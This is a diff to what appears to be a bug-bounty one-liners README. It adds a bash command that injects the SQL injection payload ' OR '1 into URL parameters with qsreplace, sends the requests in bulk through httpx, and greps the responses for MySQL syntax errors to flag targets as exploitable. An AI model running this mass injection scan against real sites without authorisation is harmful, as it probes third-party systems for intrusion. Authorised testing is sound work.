@@ -97,6 +97,17 @@ psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null
 ./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
 ```
 
+###  Search SQLINJECTION using qsreplace search syntax error
+> @OFJAAAH
+> @b51b5b43
+
+- [Explicated comand](https://bit.ly/3hxFWS2)
+
+```bash
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+```
+
+
 # Project
 
 [![made-with-Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg)](http://golang.org)
